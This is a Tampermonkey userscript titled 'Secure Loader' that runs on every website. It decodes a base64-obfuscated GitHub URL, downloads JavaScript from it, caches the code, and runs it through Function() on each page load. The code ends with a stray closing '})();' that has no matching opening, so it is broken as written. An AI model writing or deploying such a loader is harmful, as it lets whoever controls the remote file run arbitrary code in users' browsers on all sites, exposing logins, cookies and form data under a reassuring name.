    // ==UserScript==
    // @name         🔒 Secure Loader
    // @namespace    http://tampermonkey.net/
    // @version      1.0
    // @description  Loads remote source
    // @author       Ghost
    // @match        *://*/*
    // @grant        GM_getValue
    // @grant        GM_setValue
    // ==/UserScript==


    const encodedURL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhdjU3MC90YW1wZXJtb25rZXktc2NyaXB0LW9zYXMvcmVmcy9oZWFkcy9tYWluL3JlbW90ZS1jb2RlL2luZGV4Lmpz"; // https://raw.githubusercontent.com/dav570/tampermonkey-script-osas/refs/heads/main/remote-code/index.js
    const remoteURL = atob(encodedURL);

    const CACHE_KEY = "remote_script_code";

    // Load from cache and execute immediately
    const cachedCode = GM_getValue(CACHE_KEY, null);
    if (cachedCode) {
        try {
            Function(cachedCode)();
        } catch (err) {
            console.error("Error running cached code:", err);
        }
    }

    // Always try to fetch updated script in background
    fetch(remoteURL)
        .then(res => res.text())
        .then(latestCode => {
            if (latestCode !== cachedCode) {
                GM_setValue(CACHE_KEY, latestCode);
                console.log("🆕 Updated script from remote.");
            } else {
                console.log("✅ Remote script is up-to-date.");
            }
        })
        .catch(err => {
            console.warn("⚠️ Could not fetch remote script:", err);
        });
})();
